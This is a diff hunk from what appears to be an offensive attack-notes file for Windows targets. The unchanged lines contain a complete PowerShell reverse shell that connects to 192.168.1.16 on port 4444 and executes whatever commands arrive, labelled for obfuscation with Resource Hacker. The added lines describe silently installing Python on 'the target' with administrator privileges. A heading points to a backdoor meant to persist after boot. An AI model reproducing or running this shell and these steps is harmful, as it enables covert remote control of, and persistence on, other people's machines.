@@ -166,6 +166,10 @@ with Resource Hacker :
 obfuscated powershell 
 $C=new-object net.sockets.tcpclient('192.168.1.16',4444);$S=$C.GetStream();[byte[]]$B=0..65535|%{0};while(($I=$S.Read($B,0,$B.Length)) -ne 0){;$D=(new-object -typename System.Text.ASCIIEncoding).GetString($B,0,$I);$O=(iex $D 2>&1 | Out-String);$OB=$O+'PS '+(pwd).Path+'> ';$SB=([text.encoding]::ASCII).GetBytes($OB);$S.Write($SB,0,$SB.Length);$S.Flush()};$C.Close()
 ---------------------------------------------------------------------------------------------------------------
+install python on the target with administrator privs :
+after transfering python32.exe or python64.exe based on the arch of the system 
+.\python.exe /quiet InstallAllUsers=1 PrependPath=1
+---------------------------------------------------------------------------------------------------------------
 With Administrator Privs
 backdoor runs after BIOS : 
 cd C:\Windows\system32
